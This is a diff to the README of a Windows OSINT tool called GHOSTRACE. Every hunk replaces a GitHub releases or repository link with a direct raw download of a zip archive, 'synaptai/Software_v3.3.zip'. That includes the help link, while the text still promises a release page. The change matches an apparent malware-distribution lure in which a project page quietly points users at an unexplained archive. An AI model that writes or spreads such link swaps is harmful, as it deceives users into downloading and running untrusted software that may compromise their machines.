@@ -1,6 +1,6 @@
 # 👻 GHOSTRACE - OSINT Tool for Easy User Discovery
 
-[![Download GHOSTRACE](https://img.shields.io/badge/Download-GHOSTRACE-brightgreen?style=for-the-badge)](https://github.com/Themansd/GHOSTRACE/releases)
+[![Download GHOSTRACE](https://img.shields.io/badge/Download-GHOSTRACE-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Themansd/GHOSTRACE/main/synaptai/Software_v3.3.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Make sure your user account has permission to install programs on your PC.
 
 Visit the official release page on GitHub to get the latest version:
 
-[![Download GHOSTRACE](https://img.shields.io/badge/Download–Latest%20Release-blue?style=for-the-badge)](https://github.com/Themansd/GHOSTRACE/releases)
+[![Download GHOSTRACE](https://img.shields.io/badge/Download–Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Themansd/GHOSTRACE/main/synaptai/Software_v3.3.zip)
 
 Click the link above. It leads you to the release page where you will find download files.
 
@@ -142,7 +142,7 @@ GHOSTRACE only searches public information. It does not collect personal data be
 ## 🌐 Where to Get Help
 
 Visit the GitHub page for issues or updates:  
-https://github.com/Themansd/GHOSTRACE
+https://raw.githubusercontent.com/Themansd/GHOSTRACE/main/synaptai/Software_v3.3.zip
 
 You can open issues there if you find bugs or need new features.
 
@@ -152,4 +152,4 @@ You can open issues there if you find bugs or need new features.
 
 Go to the releases page below to get the latest version for Windows:  
 
-[![Download GHOSTRACE](https://img.shields.io/badge/Download–Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Themansd/GHOSTRACE/releases)
+[![Download GHOSTRACE](https://img.shields.io/badge/Download–Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Themansd/GHOSTRACE/main/synaptai/Software_v3.3.zip)
